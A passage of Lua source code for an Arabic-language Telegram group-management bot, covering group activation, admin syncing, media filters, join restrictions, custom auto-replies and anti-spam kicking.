if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if DevAIAN:get(WAAD..'AIAN:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
end   
end
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then   
DevAIAN:incr(WAAD..'AIAN:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
elseif msg.content_.ID == "MessageChatDeleteMember" then   
DevAIAN:incr(WAAD..'AIAN:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
end
--     Source WAAD     --
if text ==('تفعيل') and not SudoBot(msg) and ChCheck(msg) then
if not DevAIAN:get(WAAD..'AIAN:Lock:FreeBot'..WAAD) then
if ChatType == 'pv' then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لاتستطيع تفعيلي هنا يرجى اضافتي في مجموعه اولا', 1, 'md')
return false
end
if ChatType ~= 'sp' then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙البوت ليس ادمن يرجى ترقيتي !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,ChatMem) 
if ChatMem and ChatMem.status_.ID == "ChatMemberStatusEditor" or ChatMem and ChatMem.status_.ID == "ChatMemberStatusCreator" then
if ChatMem and ChatMem.user_id_ == msg.sender_user_id_ then
if ChatMem.status_.ID == "ChatMemberStatusCreator" then
status = 'منشئ'
elseif ChatMem.status_.ID == "ChatMemberStatusEditor" then
status = 'ادمن'
else 
status = 'عضو'
end
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,SoOoFi) 
local admins = SoOoFi.members_
for i=0 , #admins do
if SoOoFi.members_[i].bot_info_ == false and SoOoFi.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevAIAN:sadd(WAAD..'AIAN:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
DevAIAN:sadd(WAAD..'AIAN:Admins:'..msg.chat_id_, admins[i].user_id_)
end
if SoOoFi.members_[i].status_.ID == "ChatMemberStatusCreator" then
DevAIAN:sadd(WAAD.."AIAN:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevAIAN:sadd(WAAD.."AIAN:AIANConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevAIAN:srem(WAAD.."AIAN:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevAIAN:srem(WAAD.."AIAN:AIANConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevAIAN:sismember(WAAD..'AIAN:Groups',msg.chat_id_) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙المجموعه بالتاكيد مفعله', 1, 'md')
else
if tonumber(data.member_count_) < tonumber(DevAIAN:get(WAAD..'AIAN:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙عدد اعضاء المجموعه اقل من ↫ *'..(DevAIAN:get(WAAD..'AIAN:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
ReplyStatus(msg,result.id_,"ReplyBy","⌯︙تم تفعيل المجموعه "..dp.title_)  
DevAIAN:sadd(WAAD.."AIAN:Groups",msg.chat_id_)
DevAIAN:sadd(WAAD..'AIAN:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevAIAN:set(WAAD.."AIAN:Groups:Links"..msg.chat_id_,LinkGroup) 
SendText(WAAD,"⌯︙تم تفعيل مجموعه جديده ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n⌯︙بواسطة ↫ "..Name.."\n⌯︙موقعه في المجموعه ↫ "..status.."\n⌯︙اسم المجموعه ↫ ["..NameChat.."]\n⌯︙عدد اعضاء المجموعه ↫ ❨ *"..NumMem.."* ❩\n⌯︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n⌯︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n⌯︙الوقت ↫ "..os.date("%I:%M%p").."\n⌯︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end end
end,nil)
end,nil)
end,nil)
end,nil)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙لا تستطيع تفعيل هذه المجموعه بسبب تعطيل البوت الخدمي من قبل المطور الاساسي', 1, 'md') 
end 
end 
--     Source WAAD     --
if msg.date_ and msg.date_ < tonumber(os.time() - 30) then
print("*( OLD MESSAGE )*")
return false
end
--     Source WAAD     --
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
DevAIAN:set(WAAD..'Save:UserName'..msg.sender_user_id_,data.username_)
end;end,nil) 
--     Source WAAD     --
local ReFalse = tostring(msg.chat_id_)
if not DevAIAN:sismember(WAAD.."AIAN:Groups",msg.chat_id_) and not ReFalse:match("^(%d+)") and not SudoBot(msg) then
print("Return False : The Bot Is Not Enabled In The Group")
return false
end
--     Source WAAD     --
-------- MSG TYPES ---------
if msg.content_.ID == "MessageChatJoinByLink" and not VipMem(msg) then 
if DevAIAN:get(WAAD..'AIAN:Lock:Robot'..msg.chat_id_) then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..dp.id_)
DevAIAN:sadd(WAAD..'AIAN:Tkeed:'..msg.chat_id_, dp.id_)
local Text = '⌯︙اهلا عزيزي ↫ ['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')\n⌯︙يجب علينا التأكد أنك لست روبوت\n⌯︙تم تقيدك اضغط الزر بالاسفل لفكه'
keyboard = {} 
keyboard.inline_keyboard = {{{text="اضغط هنا لفك تقيدك",callback_data="/UnTkeed"}}} 
Msg_id = msg.id_/2097152/0.5
HTTPS.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text='..URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
return false
end
if DevAIAN:get(WAAD.."AIAN:Lock:Join"..msg.chat_id_) then
ChatKick(msg.chat_id_,msg.sender_user_id_) 
return false  
end
end
if msg.content_.ID == "MessagePhoto" then
if not Manager(msg) then 
local filter = DevAIAN:smembers(WAAD.."AIAN:FilterPhoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌯︙الصوره التي ارسلتها تم منعها من المجموعه")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false   
end
end
end
end
if msg.content_.ID == "MessageAnimation" then
if not Manager(msg) then 
local filter = DevAIAN:smembers(WAAD.."AIAN:FilterAnimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌯︙المتحركه التي ارسلتها تم منعها من المجموعه")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
end
if msg.content_.ID == "MessageSticker" then
if not Manager(msg) then 
local filter = DevAIAN:smembers(WAAD.."AIAN:FilterSteckr"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.sticker_.sticker_.persistent_id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌯︙الملصق الذي ارسلته تم منعه من المجموعه")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false   
end
end
end
end
--     Source WAAD     --
if text and text:match("^(.*)$") then
local DelGpRedRedods = DevAIAN:get(WAAD..'AIAN:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
local GetGpTexts = DevAIAN:get(WAAD..'AIAN:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
if DelGpRedRedods == 'DelGpRedRedods' then
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙الرد ↫ '..msg.content_.text_..' للكلمه ↫ '..GetGpTexts..' تم حذفها',  1, "html")
DevAIAN:del(WAAD..'AIAN:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevAIAN:srem(WAAD..'AIAN:Text:GpTexts'..GetGpTexts..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevAIAN:get(WAAD..'AIAN:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRedod' then
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙الكلمه ↫ '..msg.content_.text_..' تم حذفها',  1, "html")
DevAIAN:del(WAAD..'AIAN:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Text:GpTexts'..msg.content_.text_..msg.chat_id_)
DevAIAN:srem(WAAD..'AIAN:Manager:GpRedod'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevAIAN:get(WAAD..'AIAN:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRed' then
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙الكلمه ↫ '..msg.content_.text_..' تم حذفها',  1, "html")
DevAIAN:del(WAAD..'AIAN:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Gif:GpRed'..msg.content_.text_..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Voice:GpRed'..msg.content_.text_..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Audio:GpRed'..msg.content_.text_..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Photo:GpRed'..msg.content_.text_..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Stecker:GpRed'..msg.content_.text_..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Video:GpRed'..msg.content_.text_..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:File:GpRed'..msg.content_.text_..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Text:GpRed'..msg.content_.text_..msg.chat_id_)
DevAIAN:srem(WAAD..'AIAN:Manager:GpRed'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelAllRed = DevAIAN:get(WAAD.."AIAN:Add:AllRed"..msg.sender_user_id_)
if DelAllRed == 'DelAllRed' then
Dev_AIAN(msg.chat_id_, msg.id_, 1,'⌯︙الكلمه ↫ '..msg.content_.text_..' تم حذفها',  1, "html")
DevAIAN:del(WAAD.."AIAN:Add:AllRed"..msg.sender_user_id_)
DevAIAN:del(WAAD.."AIAN:Gif:AllRed"..msg.content_.text_)
DevAIAN:del(WAAD.."AIAN:Voice:AllRed"..msg.content_.text_)
DevAIAN:del(WAAD.."AIAN:Audio:AllRed"..msg.content_.text_)
DevAIAN:del(WAAD.."AIAN:Photo:AllRed"..msg.content_.text_)
DevAIAN:del(WAAD.."AIAN:Stecker:AllRed"..msg.content_.text_)
DevAIAN:del(WAAD.."AIAN:Video:AllRed"..msg.content_.text_)
DevAIAN:del(WAAD.."AIAN:File:AllRed"..msg.content_.text_)
DevAIAN:del(WAAD.."AIAN:Text:AllRed"..msg.content_.text_)
DevAIAN:del(WAAD.."AIAN:Sudo:AllRed",msg.content_.text_)
return false
end
end
--     Source WAAD     --
if text and text:match("^(.*)$") then
local SaveGpRedod = DevAIAN:get(WAAD..'AIAN:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRedod == 'SaveGpRedod' then
local GetGpTexts = DevAIAN:get(WAAD..'AIAN:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
local List = DevAIAN:smembers(WAAD..'AIAN:Text:GpTexts'..GetGpTexts..msg.chat_id_)
if text == "الغاء" then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙⌯︙تم الغاء عملية حفظ الردود المتعدده للامر ↫ "..GetGpTexts ,  1, "md")
DevAIAN:del(WAAD..'AIAN:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Text:GpTexts'..GetGpTexts..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
DevAIAN:srem(WAAD..'AIAN:Manager:GpRedod'..msg.chat_id_,GetGpTexts)
return false
end
Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
DevAIAN:sadd(WAAD..'AIAN:Text:GpTexts'..GetGpTexts..msg.chat_id_,Text)
if #List == 4 then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم حفظ ↫ 5 من الردود المتعدده للامر ↫ "..GetGpTexts ,  1, "md")
DevAIAN:del(WAAD..'AIAN:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
local AIAN = "⌯︙تم حفظ الرد رقم ↫ "..(#List+1).."\n⌯︙قم بارسال الرد رقم ↫ "..(#List+2)
keyboard = {} 
keyboard.inline_keyboard = {{{text="انهاء وحفظ "..(#List+1).." من الردود",callback_data="/EndRedod:"..msg.sender_user_id_..GetGpTexts}},{{text="الغاء وحذف التخزين",callback_data="/DelRedod:"..msg.sender_user_id_..GetGpTexts}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(AIAN).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
end
if text and not DevAIAN:get(WAAD..'AIAN:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_) then
if DevAIAN:sismember(WAAD..'AIAN:Manager:GpRedod'..msg.chat_id_,text) then
local WAAD =  DevAIAN:smembers(WAAD..'AIAN:Text:GpTexts'..text..msg.chat_id_)
Dev_AIAN(msg.chat_id_, msg.id_, 1, '['..WAAD[math.random(#WAAD)]..']' , 1, 'md')  
end
end
--     Source WAAD     --
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local SaveGpRed = DevAIAN:get(WAAD..'AIAN:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRed == 'SaveGpRed' then 
if text == 'الغاء' then
local DelManagerRep = DevAIAN:get(WAAD..'DelManagerRep'..msg.chat_id_)
DevAIAN:srem(WAAD..'AIAN:Manager:GpRed'..msg.chat_id_,DelManagerRep)
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم الغاء حفظ الرد', 1, 'md')
DevAIAN:del(WAAD..'AIAN:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevAIAN:del(WAAD..'DelManagerRep'..msg.chat_id_)
return false
end
DevAIAN:del(WAAD..'AIAN:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
local SaveGpRed = DevAIAN:get(WAAD..'AIAN:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
if msg.content_.video_ then DevAIAN:set(WAAD..'AIAN:Video:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then DevAIAN:set(WAAD..'AIAN:File:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then DevAIAN:set(WAAD..'AIAN:Stecker:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then DevAIAN:set(WAAD..'AIAN:Voice:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then DevAIAN:set(WAAD..'AIAN:Audio:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_) 
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
DevAIAN:set(WAAD..'AIAN:Photo:GpRed'..SaveGpRed..msg.chat_id_, photo_in_group) 
end
if msg.content_.animation_ then DevAIAN:set(WAAD..'AIAN:Gif:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
DevAIAN:set(WAAD..'AIAN:Text:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.text_)
end 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم حفظ الرد الجديد', 1, 'md') 
DevAIAN:del(WAAD..'AIAN:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
DevAIAN:del(WAAD..'DelManagerRep'..msg.chat_id_)
return false 
end 
end
if msg.content_.text_ and not DevAIAN:get(WAAD..'AIAN:Lock:GpRed'..msg.chat_id_) then 
if DevAIAN:get(WAAD..'AIAN:Video:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevAIAN:get(WAAD..'AIAN:Video:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevAIAN:get(WAAD..'AIAN:File:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevAIAN:get(WAAD..'AIAN:File:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevAIAN:get(WAAD..'AIAN:Voice:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevAIAN:get(WAAD..'AIAN:Voice:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevAIAN:get(WAAD..'AIAN:Audio:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevAIAN:get(WAAD..'AIAN:Audio:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevAIAN:get(WAAD..'AIAN:Photo:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevAIAN:get(WAAD..'AIAN:Photo:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevAIAN:get(WAAD..'AIAN:Gif:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevAIAN:get(WAAD..'AIAN:Gif:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevAIAN:get(WAAD..'AIAN:Stecker:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevAIAN:get(WAAD..'AIAN:Stecker:GpRed'..msg.content_.text_..msg.chat_id_))
end
if DevAIAN:get(WAAD..'AIAN:Text:GpRed'..msg.content_.text_..msg.chat_id_) then
function WAAD(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevAIAN:get(WAAD..'AIAN:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevAIAN:get(WAAD..'AIAN:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevAIAN:get(WAAD..'AIAN:Text:GpRed'..msg.content_.text_..msg.chat_id_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
local Text = Text:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
send(msg.chat_id_, msg.id_,'['..Text..']')
end
getUser(msg.sender_user_id_, WAAD)
end
end
--     Source WAAD     --
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local SaveAllRed = DevAIAN:get(WAAD.."AIAN:Add:AllRed"..msg.sender_user_id_)
if SaveAllRed == 'SaveAllRed' then
if text == 'الغاء' then
local DelSudoRep = DevAIAN:get(WAAD..'DelSudoRep')
DevAIAN:del(WAAD.."AIAN:Sudo:AllRed",DelSudoRep)
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم الغاء حفظ الرد', 1, 'md')
DevAIAN:del(WAAD.."AIAN:Add:AllText"..msg.sender_user_id_)
DevAIAN:del(WAAD.."AIAN:Add:AllRed"..msg.sender_user_id_)
DevAIAN:del(WAAD.."DelSudoRep")
return false
end
DevAIAN:del(WAAD.."AIAN:Add:AllRed"..msg.sender_user_id_)
local SaveAllRed = DevAIAN:get(WAAD.."AIAN:Add:AllText"..msg.sender_user_id_)
if msg.content_.video_ then
DevAIAN:set(WAAD.."AIAN:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
DevAIAN:set(WAAD.."AIAN:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
DevAIAN:set(WAAD.."AIAN:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
DevAIAN:set(WAAD.."AIAN:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
DevAIAN:set(WAAD.."AIAN:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_all_groups = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_all_groups = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_all_groups = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_all_groups = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
DevAIAN:set(WAAD.."AIAN:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
end
if msg.content_.animation_ then
DevAIAN:set(WAAD.."AIAN:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
DevAIAN:set(WAAD.."AIAN:Text:AllRed"..SaveAllRed, msg.content_.text_)
end 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم حفظ الرد الجديد', 1, 'md') 
DevAIAN:del(WAAD.."AIAN:Add:AllText"..msg.sender_user_id_)
DevAIAN:del(WAAD..'DelSudoRep')
return false end end
if msg.content_.text_ and not DevAIAN:get(WAAD..'AIAN:Lock:AllRed'..msg.chat_id_) then
if DevAIAN:get(WAAD.."AIAN:Video:AllRed"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevAIAN:get(WAAD.."AIAN:Video:AllRed"..msg.content_.text_))
end
if DevAIAN:get(WAAD.."AIAN:File:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevAIAN:get(WAAD.."AIAN:File:AllRed"..msg.content_.text_))
end
if DevAIAN:get(WAAD.."AIAN:Voice:AllRed"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevAIAN:get(WAAD.."AIAN:Voice:AllRed"..msg.content_.text_))
end
if DevAIAN:get(WAAD.."AIAN:Audio:AllRed"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevAIAN:get(WAAD.."AIAN:Audio:AllRed"..msg.content_.text_))
end
if DevAIAN:get(WAAD.."AIAN:Photo:AllRed"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevAIAN:get(WAAD.."AIAN:Photo:AllRed"..msg.content_.text_))
end
if  DevAIAN:get(WAAD.."AIAN:Gif:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevAIAN:get(WAAD.."AIAN:Gif:AllRed"..msg.content_.text_))
end
if DevAIAN:get(WAAD.."AIAN:Stecker:AllRed"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevAIAN:get(WAAD.."AIAN:Stecker:AllRed"..msg.content_.text_))
end
if DevAIAN:get(WAAD.."AIAN:Text:AllRed"..msg.content_.text_) then
function WAAD(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevAIAN:get(WAAD..'AIAN:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevAIAN:get(WAAD..'AIAN:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevAIAN:get(WAAD.."AIAN:Text:AllRed"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
local Text = Text:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
send(msg.chat_id_, msg.id_,'['..Text..']')
end
getUser(msg.sender_user_id_, WAAD)
end
end 
--     Source WAAD     --
--       Spam Send        --
function NotSpam(msg,Type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dp) 
local GetName = '['..dp.first_name_..'](tg://user?id='..dp.id_..')'
if Type == "kick" then 
ChatKick(msg.chat_id_,msg.sender_user_id_) 
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '⌯︙العضو ↫ '..GetName..' \n⌯︙قام بالتكرار المحدد تم طرده '
SendText(msg.chat_id_,Text,0,'md')
return false  
end 
if Type == "del" then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
return false  
end 
if Type == "keed" and not DevAIAN:sismember(WAAD..'AIAN:Tkeed:'..msg.chat_id_, msg.sender_user_id_) then
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_.."") 
DevAIAN:sadd(WAAD..'AIAN:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
